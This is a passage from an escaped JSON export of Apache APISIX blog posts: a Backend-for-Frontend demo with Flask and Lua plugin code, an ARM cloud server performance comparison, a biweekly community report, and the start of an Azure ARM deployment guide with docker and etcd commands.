\ud83d\udc81\\n\\n\u2794 Watch Video Tutorial:\\n\\n- [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so).\\n  \\n- [Manage .NET Microservice API with Apache APISIX API Gateway](https://youtu.be/nU8-uQkAHA4).\\n\\n\u2794 Read the blog posts:\\n\\n- [Overview of Apache APISIX API Gateway Plugins](https://dev.to/apisix/overview-of-apache-apisix-api-gateway-plugins-2m8o).\\n\\n- [Run Apache APISIX on Microsoft Azure Container Instance](https://dev.to/apisix/run-apache-apisix-on-microsoft-azure-container-instance-1gdk).\\n\\n- [API Security with OIDC by using Apache APISIX and Microsoft Azure AD](https://dev.to/apisix/api-security-with-oidc-by-using-apache-apisix-and-microsoft-azure-ad-50h3).\\n\\n- [API Observability with Apache APISIX Plugins](https://dev.to/apisix/apis-observability-with-apache-apisix-plugins-1bnm)."},{"id":"Backend-for-Frontend: the demo","metadata":{"permalink":"/blog/2022/08/17/backend-for-frontend-demo","source":"@site/blog/2022/08/17/backend-for-frontend-demo.md","title":"Backend-for-Frontend: the demo","description":"The Backend-For-Frontend pattern describes how to return different data for each client in a microservices architecture. This article goes through the code required to implement the different possible implementations.","date":"2022-08-17T00:00:00.000Z","formattedDate":"August 17, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.86,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Fault Injection Testing with API Gateway","permalink":"/blog/2022/08/28/fault-injection-testing-with-api-gateway"},"nextItem":{"title":"GCP, AWS, Azure, and OCI ARM-Based Server Performance Comparison","permalink":"/blog/2022/08/12/arm-performance-google-aws-azure-with-apisix"}},"content":"> This article describes a demo code to implement the Backend-For-Frontend pattern.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/backend-for-frontend-demo/\\" />\\n</head>\\n\\nIn [one of my earlier posts](https://blog.frankel.ch/backend-for-frontend/), I described the Backend-for-Frontend pattern. In short, it offers a single facade over multiple backend parts. Moreover, it provides each client type, _e.g._ desktop, mobile, exactly the data that it needs and not more in the format required by this client type.\\n\\n## The use-case\\n\\nImagine the following use-case. In a e-commerce shop, the home page should display multiple *unrelated* data at once.\\n\\n* Products: The business could configure which items are shown on the home page. They could be generic, \\"hero\\" products, or personalized, products that the customer ordered previously.\\n* News: Again, the newsfeed could be generic or personalized.\\n* Profile-related information\\n* Cart content\\n* Non-business related information, such as build number, build timestamp, version, etc.\\n\\nDepending on the client, we want more or less data. For example, on a client with limited display size, we probably want to limit a product to its name and its image. On the other hand, on desktop, we are happy to display both the above, plus a catch phrase (or a more catchy - and longer - name) and the full description.\\n\\nEvery client requires its specific data and for performance reasons, we want to fetch them in a single call. It sounds like a use-case for <abbr title=\\"Backend-for-Frontend\\">BFF</abbr>.\\n\\n## Setting up the demo\\n\\nIn order to simplify things, I\'ll keep only three sources of data: products, news and technical data. Three unrelated data sources are enough to highlight the issue.\\n\\nIn the demo, I\'m using Python and Flask, but the underlying technology is irrelevant, since BFF is an architectural pattern.\\n\\nThe initial situation is a monolith. The monolith offers an endpoint for each data source, and a single aggregating endpoint for all of them:\\n\\n```python\\n@app.route(\\"/\\")\\ndef home():\\n    return {\\n      \'products\': products,       #1\\n      \'news\': news,               #1\\n      \'info\': debug               #1\\n  }\\n```\\n\\nSomehow get the data internally, _e.g._, from the database.\\n\\nAt this point, everything is fine. We can provide different data depending on the client:\\n\\n* If we want to put the responsibility on the client, we provide a dedicated endpoint\\n* If we want it server-side, we can read the `User-Agent` from the request (or agree on a specific `X-` HTTP header)\\n\\nAs it doesn\'t add anything to the demo, I won\'t provide different data depending on the client in the following.\\n\\n## Migrating to microservices\\n\\nAt one point, the organization decides to migrate to a microservices architecture. The reason might be because the CTO read about microservices in a blog post, because the team lead wants to add microservices on its resume, or even because the development grew too big and the organization do need to evolve. In any case, the monolith has to be split in *two* microservices: a catalog providing products and a newsfeed providing... news.\\n\\nHere\'s the code for each microservice:\\n\\n```python\\n@app.route(\\"/info\\")\\ndef info():\\n    return debug                 #1\\n\\n\\n@app.route(\\"/products\\")\\ndef get_products():\\n    return jsonify(products)     #2\\n```\\n\\n1. Each microservice has its own `debug` endpoint\\n2. The payload is not an object anymore but an array\\n\\n```python\\n@app.route(\\"/info\\")\\ndef info():\\n    return debug                 #1\\n\\n\\n@app.route(\\"/news\\")\\ndef get_news():\\n    return jsonify(news)         #1\\n```\\n\\nAs shown above, now each client needs two calls, and filter out data that are not relevant.\\n\\n## Dedicated backend-for-frontend\\n\\nBecause of the issues highlighted above, a solution is to develop one application that does the aggregation and filtering. There should be one for each client type, and it should be cared for by the same team as the client. Again, for this demo, it\'s enough to have a single one that only does aggregation.\\n\\n```python\\n@app.route(\\"/\\")\\ndef home():\\n    products = requests.get(products_uri).json()            #1\\n    catalog_info = requests.get(catalog_info_uri).json()    #2\\n    news = requests.get(news_uri).json()                    #1\\n    news_info = requests.get(news_info_uri).json()          #2\\n    return {\\n      \'products\': products,\\n      \'news\': news,\\n      \'info\': {                                             #3\\n          \'catalog\': catalog_info,\\n          \'news\': news_info\\n      }\\n    }\\n```\\n\\n1. Get data\\n2. Get debug info\\n3. The returned JSON should be designed for easy consumption on the client side. To illustrate it, I chose for the debug data to be nested instead of top-level.\\n\\n## Backend-for-frontend at the API Gateway level\\n\\nIf you\'re offering APIs, whether internally or to the outside world, chances are high that you\'re already using an API Gateway. If not, you should probably [deeply consider](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) starting to. In the following, I assume that you do use one.\\n\\nIn the previous section, we developed a dedicated backend-for-frontend application. However, requests already go through the gateway. In this case, the gateway can be seen as a container where to deploy BFF plugins. I\'ll be using [Apache APISIX](https://apisix.apache.org/) to demo how to do it, but the idea can be replicated on other gateways as well.\\n\\nFirst things first, there\'s no generic way to achieve the result we want. For this reason, we cannot rely on an existing plugin, but we have to design our own. APISIX documents [how to do so](https://apisix.apache.org/docs/apisix/plugin-develop/). Our goal is to fetch data from all endpoints as above, but via the plugin.\\n\\nFirst, we need to expose a dedicated endpoint, _e.g._, `/bff/desktop` or `/bff/phone`. APISIX allows such _virtual_ endpoints via the [public-api](https://apisix.apache.org/docs/apisix/plugins/public-api/) plugin. Next, we need to develop our plugin, `bff`. Here\'s the configuration snippet:\\n\\n```yaml\\nroutes:\\n  - uri: /                     #1\\n    plugins:\\n      bff: ~                   #2\\n      public-api: ~            #2\\n```\\n\\n1. For demo purposes, I preferred to set it at the root instead of `/bff/*`\\n2. Declare the two plugins. Note that I\'m using the [stand-alone mode](https://apisix.apache.org/docs/apisix/deployment-modes/#standalone).\\n\\nFirst, we need to describe the plugin and not forget to return it at the end of the file:\\n\\n```lua\\nlocal plugin_name = \'bff-plugin\'\\n\\nlocal _M = {                           --1\\n    version = 1.0,\\n    priority = 100,                    --2\\n    name = plugin_name,\\n    schema = {},                       --3\\n}\\n\\nreturn _M                              --4\\n```\\n\\n1. The table needs to be named `_M`\\n2. In this scenario, `priority` is irrelevant as no other plugins are involved (but `public_api`)\\n3. No schema is necessary as there\'s no configuration\\n4. Don\'t forget to return it!\\n\\nA plugin that has a public API needs to define an `api()` function returning an object describing matching HTTP methods, the matching URI, and the handler function.\\n\\n```lua\\nfunction _M.api()\\n    return {\\n        {\\n            methods = { \'GET\' },\\n            uri = \\"/\\",\\n            handler = fetch_all_data,\\n        }\\n    }\\nend\\n```\\n\\nNow, we have to define the `fetch_all_data` function. It\'s only a matter of making HTTP calls to the catalog and newsfeed microservices. Have a look at [the code](https://github.com/ajavageek/backend-for-frontend/blob/master/bff_plugin/init.lua#L24-L52) if you\'re interested in the exact details.\\n\\nAt this point, the (single) client can query `http://localhost:9080/` and get the complete payload.\\n\\nIn a \\"real life\\" microservices-based organization, every team should be independent of each other. With this approach, each can develop its own BFF as a plugin and deploy it independently in the gateway.\\n\\n## Bonus: a poor man\'s BFF\\n\\nThe microservices architecture creates two problems for clients:\\n\\n1. The need to fetch all data and filter out the unnecessary ones\\n2. Multiple calls to each service\\n\\nThe BFF pattern allows to fix both of them, at the cost of custom development, regardless whether it\'s for a dedicated app or a gateway plugin. If you\'re not willing to spend time in custom development, you can still avoid #2 by using a nifty plugin of Apache APISIX, `batch-requests`:\\n\\n>The `batch-requests` plugin accepts multiple requests, sends them from APISIX via HTTP pipelining, and returns an aggregated response to the client.\\n>\\n>This improves the performance significantly in cases where the client needs to access multiple APIs.\\n>\\n> -- [batch-requests](https://apisix.apache.org/docs/apisix/plugins/batch-requests/)\\n\\nIn essence, the client would need to send the following payload to a previously configured endpoint:\\n\\n```json\\n{\\n    \\"timeout\\": 502,\\n    \\"pipeline\\": [\\n        {\\n            \\"method\\": \\"GET\\",\\n            \\"path\\": \\"/products\\"\\n        },\\n        {\\n            \\"method\\": \\"GET\\",\\n            \\"path\\": \\"/news\\"\\n        },\\n        {\\n            \\"method\\": \\"GET\\",\\n            \\"path\\": \\"/catalog/info\\"\\n        },\\n        {\\n            \\"method\\": \\"GET\\",\\n            \\"path\\": \\"/news/info\\"\\n        }\\n    ]\\n}\\n```\\n\\nThe response will in turn look like:\\n\\n```json\\n[\\n  {\\n    \\"status\\": 200,\\n    \\"reason\\": \\"OK\\",\\n    \\"body\\": \\"{\\\\\\"ret\\\\\\":200,\\\\\\"products\\\\\\":\\\\\\"[ ... ]\\\\\\"}\\",\\n    \\"headers\\": {\\n      \\"Connection\\": \\"keep-alive\\",\\n      \\"Date\\": \\"Sat, 11 Apr 2020 17:53:20 GMT\\",\\n      \\"Content-Type\\": \\"application/json\\",\\n      \\"Content-Length\\": \\"123\\",\\n      \\"Server\\": \\"APISIX web server\\"\\n    }\\n  },\\n  {\\n    \\"status\\": 200,\\n    \\"reason\\": \\"OK\\",\\n    \\"body\\": \\"{\\\\\\"ret\\\\\\":200,\\\\\\"news\\\\\\":\\\\\\"[ ... ]\\\\\\"}\\",\\n    \\"headers\\": {\\n      \\"Connection\\": \\"keep-alive\\",\\n      \\"Date\\": \\"Sat, 11 Apr 2020 17:53:20 GMT\\",\\n      \\"Content-Type\\": \\"application/json\\",\\n      \\"Content-Length\\": \\"456\\",\\n      \\"Server\\": \\"APISIX web server\\"\\n    }\\n  },\\n  {\\n    \\"status\\": 200,\\n    \\"reason\\": \\"OK\\",\\n    \\"body\\": \\"{\\\\\\"ret\\\\\\":200,\\\\\\"version\\\\\\":\\\\\\"...\\\\\\"}\\",\\n    \\"headers\\": {\\n      \\"Connection\\": \\"keep-alive\\",\\n      \\"Date\\": \\"Sat, 11 Apr 2020 17:53:20 GMT\\",\\n      \\"Content-Type\\": \\"application/json\\",\\n      \\"Content-Length\\": \\"78\\",\\n      \\"Server\\": \\"APISIX web server\\"\\n    }\\n  },\\n  {\\n    \\"status\\": 200,\\n    \\"reason\\": \\"OK\\",\\n    \\"body\\": \\"{\\\\\\"ret\\\\\\":200,\\\\\\"version\\\\\\":\\\\\\"...\\\\\\"}\\",\\n    \\"headers\\": {\\n      \\"Connection\\": \\"keep-alive\\",\\n      \\"Date\\": \\"Sat, 11 Apr 2020 17:53:20 GMT\\",\\n      \\"Content-Type\\": \\"application/json\\",\\n      \\"Content-Length\\": \\"90\\",\\n      \\"Server\\": \\"APISIX web server\\"\\n    }\\n  }\\n]\\n```\\n\\nIt\'s up to the client to filter out unnecessary data. It\'s not as good as true BFF, but we still managed to make a single call out of 4.\\n\\n## Conclusion\\n\\nA microservices architecture brings a ton of technical issues to cope with. Among them is the need to dispatch only the required data to each kind of client. The BFF pattern aims to cope with this issue.\\n\\nIn the previous [post](https://blog.frankel.ch/backend-for-frontend/), I described the pattern from a theoretical point of view. In this post, I used a very simple ecommerce use-case to demo how to implement BFF with and without the help of Apache APISIX.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/backend-for-frontend).\\n\\n**To go further:**\\n\\n* [Pattern: Backends For Frontends](https://samnewman.io/patterns/architectural/bff/)\\n* [The API gateway pattern versus the Direct client-to-microservice communication](https://docs.microsoft.com/en-us/dotnet/architecture/microservices/architect-microservice-container-applications/direct-client-to-microservice-communication-versus-the-api-gateway-pattern)\\n* [API Gateway vs Backend For Frontend](https://www.manuelkruisz.com/blog/posts/api-gateway-vs-bff)"},{"id":"GCP, AWS, Azure, and OCI ARM-Based Server Performance Comparison","metadata":{"permalink":"/blog/2022/08/12/arm-performance-google-aws-azure-with-apisix","source":"@site/blog/2022/08/12/arm-performance-google-aws-azure-with-apisix.md","title":"GCP, AWS, Azure, and OCI ARM-Based Server Performance Comparison","description":"This article compares the performance of Google, AWS, Azure, and Oracle ARM-based servers in network IO-intensive scenarios through the API gateway Apache APISIX.","date":"2022-08-12T00:00:00.000Z","formattedDate":"August 12, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.415,"truncated":true,"authors":[{"name":"Shirui Zhao","title":"Author","url":"https://github.com/soulbird","image_url":"https://github.com/soulbird.png","imageURL":"https://github.com/soulbird.png"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"},{"name":"Yilia","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Backend-for-Frontend: the demo","permalink":"/blog/2022/08/17/backend-for-frontend-demo"},"nextItem":{"title":"Biweekly Report (Jul 16 - Jul 31)","permalink":"/blog/2022/08/09/weekly-report-0731"}},"content":"> This article uses  Apache APISIX to compare the performance of AWS, Google, Azure, and Oracle ARM-based servers in network IO-intensive scenarios.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://api7.ai/2022/08/12/arm-performance-google-aws-azure-with-apisix/\\" />\\n</head>\\n\\n## Background\\n\\nThe ARM architecture is a member of the [RISC (Reduced instruction set computer)](https://en.wikipedia.org/wiki/Reduced_instruction_set_computer) design family. The RISC microprocessor architecture design enables small processors to efficiently handle complex tasks by using a set of highly optimized instructions. Being widely used in many embedded system designs, the ARM architecture has become the cornerstone of the world\u2019s largest computing ecosystem and mobile devices. Many experts regard it as the future of cloud computing due to its advantages of low power consumption, low cost, high performance, and flexible licensing. Therefore, mainstream cloud vendors led by AWS (Amazon Web Services), GCP (Google Cloud Platform), Azure (Microsoft Azure), and OCI (Oracle Cloud Infrastructure) have successively launched ARM-based servers. This article selects servers from these vendors to conduct performance testing. Let\u2019s first examine the four major manufacturers and their products.\\n\\n## ARM Servers of Major Cloud Vendors\\n\\n### AWS Graviton\\n\\nAfter four years of development since 2018, AWS Graviton has entered its third generation age. The characteristics of these three generations of processors are as follows:\\n\\n- **AWS Graviton1** processors feature custom silicon and 64-bit Neoverse cores.\\n- **AWS Graviton2**-based instances support a wide range of general purpose, burstable, compute-optimized, memory-optimized, storage-optimized, and accelerated computing workloads, including application servers, microservices, high-performance computing (HPC), CPU-based machine learning (ML) inference, video encoding, electronic design automation, gaming, open-source databases, and in-memory caches. In order to provide a one-stop service experience, many AWS services also support Graviton2-based instances.\\n- **AWS Graviton3** processors are the latest in the AWS Graviton processor family. They provide up to 25% better compute performance, **2 times** higher floating-point performance, and up to **2 times** faster cryptographic workload performance compared to AWS Graviton2 processors. AWS Graviton3 processors deliver **3 times** better performance compared to AWS Graviton2 processors for ML workloads, including support for bfloat16. They also support DDR5 memory, which provides **50%** more memory bandwidth compared to DDR4.\\n\\nThe following figure shows the main models equipped with AWS Graviton3 processors:\\n\\n![AWS Graviton3 processors](https://static.apiseven.com/2022/10/21/6352412740665.webp)\\n\\n### Google Cloud Platform T2A\\n\\nThe Google Cloud Platform (GCP) Tau T2A VM is a preview of Google\u2019s first ARM-based virtual machine in July 2022, powered by Ampere\xae Altra\xae Arm processors based on the Neoverse N1 design. Tau T2A VMs come in various predefined VM shapes with up to 48 vCPUs per VM and 4GB of memory per vCPU. They offer 32 Gbps of network bandwidth and a wide range of network-attached storage options, making the Tau T2A VM suitable for scale-out workloads including web servers, containerized microservices, data record processing, media transcoding, and Java applications. In addition, it also has the following two characteristics:\\n\\n- **Integration with Google Cloud services**: T2A VMs support the most popular Linux operating systems such as RHEL, SUSE Linux Enterprise Server, CentOS, Ubuntu, and Rocky Linux. In addition, T2A VMs also support Container-optimized OS to bring up Docker containers quickly, efficiently, and securely. Further, developers building applications on Google Cloud can already use several Google Cloud services with T2A VMs.\\n- **Extensive ISV partner ecosystem**: Ampere lists more than 100 applications, databases, cloud-native software, and programming languages that are already running on Ampere-based T2A VMs, with more being added all the time.\\n\\nThe main models are as follows:\\n\\n![Google Cloud Platform T2A Models](https://static.apiseven.com/2022/10/21/6352412815275.webp)\\n\\n### Azure ARM-based Virtual Machines\\n\\nIn April 2022, Microsoft announced a preview of its family of Azure virtual machines based on Ampere\xae Altra\xae Arm processors. The new VMs are designed to efficiently run scale-out workloads, web servers, application servers, open-source databases, cloud-native and rich .NET applications, Java applications, game servers, media servers, and more. The new VM series includes general-purpose Dpsv5 and memory-optimized Epsv5 VMs. The main models are as follows:\\n\\n![Azure ARM-based Virtual Machines](https://static.apiseven.com/2022/10/21/635241c219ef7.jpeg)\\n\\n### Oracle Cloud Infrastructure Ampere A1 Compute\\n\\nAt the end of May 2021, Oracle released its first Arm-based computing product: the OCI Ampere A1 Compute. The product can run on Oracle Cloud Infrastructure (OCI). The main model is VM.Standard.A1.Flex (OCI A1), whose CPU core and memory can be flexibly configured.\\n\\nTo support the new Ampere A1 Compute instances in OCI, Oracle has created an [Arm developer ecosystem](https://blogs.oracle.com/cloud-infrastructure/post/oracle-makes-building-applications-on-ampere-a1-compute-instances-easy) that enables developers to seamlessly convert, build and run applications on OCI Arm instances. Additionally, Oracle has partnered with Ampere Computing, Arm, GitLab, Jenkins, and others to accelerate the Arm developer ecosystem. As a result, Arm processors have evolved from mobile devices to cloud servers, providing developers with the tools and platforms to transit, build and run Arm-based workloads.\\n\\n## Cloud Vendors ARM Server Performance Test\\n\\nAfter introducing the above four servers, we will reflect the overall performance of each server by testing single-core performance. Here the network IO-intensive API gateway [Apache APISIX](https://apisix.apache.org/) is selected to bind a single CPU core for stress testing on the four models: AWS c7g.large, GCP t2a-standard-2, Azure D2ps v5 (Although the name contains D2ps, it is a dual-core CPU belonging to the Dpsv5 series.) and OCI A1 to conduct stress testings and analyze server performance through two metrics: QPS and response latency.\\n\\n[Apache APISIX](https://github.com/apache/apisix) is a cloud-native, high-performance, scalable, open-source API gateway. Compared with traditional API gateways, Apache APISIX is developed based on NGINX and LuaJIT, with features such as dynamic routing and plugin hot reloading, which is very suitable for API management under cloud-native architecture. The architecture diagram is shown below:\\n\\n![Apache APISIX\'s Architecture Diagram](https://static.apiseven.com/2022/10/21/635241c9d2c35.jpeg)\\n\\nWe use Apache APISIX to bind a single CPU on AWS c7g.large, GCP t2a-standard-2, Azure D2ps v5 (although the name includes D2ps, but it is a dual-core CPU belonging to the Dpsv5 series), and OCI A1 to conduct stress testing and analyze the performance of the server through QPS and response latency.\\n\\nWe use [Apache APISIX\u2019s official open-source performance benchmark](https://github.com/apache/apisix/blob/master/benchmark/run.sh) for testing.\\n\\n### Test Cases\\n\\nIn this article, we test the performance of Apache APISIX in the following two typical scenarios, thus obtaining more realistic test data for comparison.\\n\\n**Scenario 1: A single upstream**\\nIn this scenario, a single upstream without any plugins is used to test the performance of Apache APISIX in pure proxy back-to-origin mode.\\n\\n**Scenario 2: Single upstream + multiple plugins**\\nThis scenario uses a single upstream with two plugins. It mainly tests the performance of APISIX when the two core consumption performance plugins, `limit-count` and `prometheus`, are operating.\\n\\n### Test Results\\n\\nThe figure below is the QPS (queries per second) test result of AWS c7g.large, GCP t2a-standard-2, Azure D2ps v5, and OCI A1. The higher the QPS value, the better the performance of the server.\\n\\n![QPS Value Comparison of AWS c7g, GCP, Azure and OCI A1](https://static.apiseven.com/2022/10/21/635241290d787.webp)\\n\\nFrom the perspective of QPS, under the network IO-intensive API gateway like Apache APISIX, the performance of these four servers is as follows:\\n\\n#### Sort performance from best to worst:\\n\\n- **Scenario 1: AWS c7g.large > Azure D2ps v5 > OCI A1 > GCP t2a-standard-2**\\n\\n  With a single upstream without any plugins, AWS c7g.large achieves a QPS of 23,000 times/sec, almost twice the performance of GCP t2a-standard-2 (11,300 times/sec QPS). There is a small gap among Azure D2ps v5, OCI A1, and GCP t2a-standard-2. OCI A1 and GCP t2a-standard-2 have almost the same performance, with a difference of only 200 times/sec.\\n\\n- **Scenario 2: AWS c7g.large > Azure D2ps v5 > GCP t2a-standard-2 > OCI A1**\\n\\n  In the scenario of a single upstream and two plug-ins, the QPS of AWS c7g.large reaches 18,000 times/sec, still leading while narrowing the gap with the other three servers. The performance of Azure D2ps v5 is slightly higher than that of OCI A1, with a difference of only 400 times/sec.\\n\\nThe figure below is the response latency test results in milliseconds. The smaller the value, the better the performance.\\n\\n![Response Latency of AWS c7g, GCP, Azure and OCI A1](https://static.apiseven.com/2022/10/21/635241298c145.webp)\\n\\nFrom the perspective of response latency, under the network IO-intensive API gateway like Apache APISIX, the performance of these four servers is as follows:\\n\\n#### Sort performance from best to worst:\\n\\n- **Scenario 1 and Scenario 2: AWS c7g.large > Azure D2ps v5 > GCP t2a-standard-2 > OCI A1**\\n\\n  In these two scenarios, the performance of AWS c7g.large is almost twice that of OCI A1, and there is little difference among the latter three.\\n\\n## Conclusion\\n\\nThrough the analysis of the performance test results of Apache APISIX, we can see that AWS Graviton3 has higher performance than GCP T2A, Azure Dpsv5, and OCI A1. However, we only used the Apache APISIX binding single-core test during the test. The performance presented by the four may be different if multi-core is used.\\n\\nWe will reveal multi-core test results in the future, please stay tuned!\\n\\n## References\\n\\n- [New \u2013 Amazon EC2 C7g Instances, Powered by AWS Graviton3 Processors](https://aws.amazon.com/cn/blogs/aws/new-amazon-ec2-c7g-instances-powered-by-aws-graviton3-processors/)\\n- [Tau T2A machine series (Preview)](https://cloud.google.com/compute/docs/general-purpose-machines#t2a_machines)\\n- [Now in preview: Azure Virtual Machines with Ampere Altra Arm-based processors](https://azure.microsoft.com/en-us/blog/now-in-preview-azure-virtual-machines-with-ampere-altra-armbased-processors/)\\n- [Ampere A1 Compute](https://www.oracle.com/hk/cloud/compute/arm/)"},{"id":"Biweekly Report (Jul 16 - Jul 31)","metadata":{"permalink":"/blog/2022/08/09/weekly-report-0731","source":"@site/blog/2022/08/09/weekly-report-0731.md","title":"Biweekly Report (Jul 16 - Jul 31)","description":"The cloud native API gateway Apache APISIX has added functions such as supporting custom plugin priorities and checking plugin_metadata in configuration files in the past two weeks.","date":"2022-08-09T00:00:00.000Z","formattedDate":"August 9, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.055,"truncated":true,"authors":[],"prevItem":{"title":"GCP, AWS, Azure, and OCI ARM-Based Server Performance Comparison","permalink":"/blog/2022/08/12/arm-performance-google-aws-azure-with-apisix"},"nextItem":{"title":"How is the Azure ARM architecture server perform?","permalink":"/blog/2022/08/08/apache-apisix-performance-test-in-azure"}},"content":"> From Jul 16th to Jul 31th, 28 contributors submitted 93 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/2022/weeklyreport/0809/4.png)\\n\\n![New Contributors](https://static.apiseven.com/2022/weeklyreport/0809/3.png)\\n\\n## Good first issue\\n\\n### Issue #7538\\n\\n**Link**: https://github.com/apache/apisix/issues/7538\\n\\n**Description**: We currently hardcore the APISIX version in the blog or doc, which has misled some newcomers when they read an old blog version. This also makes updating the latest APISIX version in the doc harder, because we need to change several places.\\n\\nLet\'s add a static file containing the version numbers, and provide a simple one-liner command to get the version number in the doc. The one-liner should be very simple so that we can copy & paste it everywhere.\\n\\n## Highlights of Recent Features\\n\\n- [Create use_real_request_uri_unsafe option in `proxy-rewrite` plugin](https://github.com/apache/apisix/pull/7401)\uff08Contributor: [ilteriseroglu-ty](https://github.com/ilteriseroglu-ty)\uff09\\n\\n- [Add ngx.shared.DICT status in `prometheus` plugin](https://github.com/apache/apisix/pull/7412)\uff08Contributor: [ccxhwmy](https://github.com/ccxhwmy)\uff09\\n\\n- [Supports dynamic control of whether plugins are running](https://github.com/apache/apisix/pull/7453)\uff08Contributor: [soulbird](https://github.com/soulbird)\uff09\\n\\n- [Support setting clock skew for verifying in `jwt-auth` plugin](https://github.com/apache/apisix/pull/7500)\uff08Contributor: [tzssangglass](https://github.com/tzssangglass)\uff09\\n\\n- [Add plugin_metadata into control API](https://github.com/apache/apisix/pull/7514)\uff08Contributor: [kingluo](https://github.com/kingluo)\uff09\\n\\n- [Support multi clickhouse endpoints in `clickhouse-logger` plugin](https://github.com/apache/apisix/pull/7517)\uff08Contributor: [zhendongcmss](https://github.com/zhendongcmss)\uff09\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX Ingress v1.5-rc1](https://apisix.apache.org/blog/2022/08/05/apisix-ingress-1.5rc1-release/)\\n\\n    Apache APISIX Ingress Controller v1.5-rc1 is officially released. Bring API Version upgrades, Gateway API support, and updates to Ingress resources.\\n\\n- [Release Apache APISIX 2.15](https://apisix.apache.org/blog/2022/07/29/release-apache-apisix-2.15/)\\n\\n    Apache APISIX 2.15 is officially released! You can customize plugin priority and whether the plugin is executed, custom error response, and indicators to support the monitoring of four layers of traffic.\\n\\n- [Why do you need Apache APISIX when you have NGINX and Kong?](https://apisix.apache.org/blog/2022/07/30/why-we-need-apache-apisix/)\\n\\n    This article describes the history of the open source API Gateway Apache APISIX architecture\'s evolution and compares the advantages of the two frameworks, Apache APISIX and NGINX."},{"id":"How is the Azure ARM architecture server perform?","metadata":{"permalink":"/blog/2022/08/08/apache-apisix-performance-test-in-azure","source":"@site/blog/2022/08/08/apache-apisix-performance-test-in-azure.md","title":"How is the Azure ARM architecture server perform?","description":"This article uses API Gateway Apache APISIX to compare the performance of Azure Ddsv5 and Azure Dpdsv5 in network IO-intensive scenarios.","date":"2022-08-08T00:00:00.000Z","formattedDate":"August 8, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.165,"truncated":true,"authors":[{"name":"Shirui Zhao","title":"Author","url":"https://github.com/soulbird","image_url":"https://github.com/soulbird.png","imageURL":"https://github.com/soulbird.png"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"Biweekly Report (Jul 16 - Jul 31)","permalink":"/blog/2022/08/09/weekly-report-0731"},"nextItem":{"title":"Release Apache APISIX Ingress v1.5-rc1","permalink":"/blog/2022/08/05/apisix-ingress-1.5rc1-release"}},"content":"> This article uses API Gateway Apache APISIX to compare the performance of Azure Ddsv5 and Azure Dpdsv5 in network IO-intensive scenarios.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://api7.ai/2022/08/08/apache-apisix-performance-test-in-azure/\\" />\\n</head>\\n\\n## Background\\n\\nIn April, Microsoft announced a preview of its family of Azure virtual machines based on Ampere\xae Altra\xae Arm processors. The new VM series includes general-purpose Dpsv5 and memory-optimized Epsv5 VMs. For details, refer to the following figure:\\n\\n![VM series](https://static.apiseven.com/2022/blog/0808/1.png)\\n\\nNotably, Ampere\xae Altra\xae Arm is a cloud-native processor, and Azure virtual machines based on Ampere\xae Altra\xae Arm processors can therefore run scale-out cloud-native applications in an efficient manner.\\n\\nSo what is the actual experience and performance? Let\'s take a cloud-native API gateway as an example to show you the performance of an Azure virtual machine based on the Arm architecture. Here, we choose Apache APISIX for installation and testing on the general-purpose Dpdsv5 series virtual machine environment.\\n\\nApache APISIX is a cloud-native, high-performance, scalable API gateway. Based on NGNIX + LuaJIT and etcd, APISIX has the characteristics of dynamic routing and plug-in hot loading compared with traditional API gateways, which is especially suitable for API management under cloud-native architecture.\\n\\n![Apache APISIX](https://static.apiseven.com/2022/blog/0808/2.png)\\n\\n## Preliminary preparation\\n\\nFirst, you need to start a Dpdsv5 series instance on Azure, and choose Ubuntu 20.04 as the operating system.\\n\\n![Dpdsv5](https://static.apiseven.com/2022/blog/0808/3.jpeg)\\n\\nThen install Docker to facilitate subsequent use of containerized methods to install and deploy Apache APISIX.\\n\\n```shell\\nsudo apt-get update && sudo apt-get install docker.io\\n```\\n\\n## Deploy Apache APISIX\\n\\nApache APISIX uses etcd as the configuration center, so you need to start an etcd instance first.\\n\\n```shell\\nsudo docker run -d --name etcd \\\\\\n    -p 2379:2379 \\\\\\n    -e ETCD_UNSUPPORTED_ARCH=arm64 \\\\\\n    -e ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    -e ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 \\\\\\n    rancher/coreos-etcd:v3.4.16-arm64\\n```\\n\\nThen start an instance of Apache 